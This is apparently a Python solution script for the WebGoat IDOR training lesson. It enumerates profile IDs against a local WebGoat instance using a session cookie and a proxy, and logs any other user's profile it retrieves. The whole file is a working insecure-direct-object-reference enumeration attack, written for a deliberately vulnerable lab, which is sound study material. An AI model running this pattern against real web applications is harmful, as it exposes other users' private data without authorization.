import requests
import logging

def run_script(url, cookie, proxy):

    for i in range(0, 999):
        padded_i = str(i).zfill(3)
        url = f'http://127.0.0.1:8080/WebGoat/IDOR/profile/2342{padded_i}'
        proxies = {
            'http': f'http://{proxy}',
            'https': f'https://{proxy}'
        }
        headers = {'Cookie': cookie}
        response = requests.get(url, headers=headers, proxies=proxies)
        if response.status_code == 200:
            if response.json()['output'] == None:
                continue
            else:
                feedback = response.json()['feedback']
                output = response.json()['output']
                logging.info(f'[*] {padded_i} FOUND !\n[*] {feedback}\n[*] {output}\n[*] Challenge IDOR résolu ! :)\n')
                continue
        else:
            continue
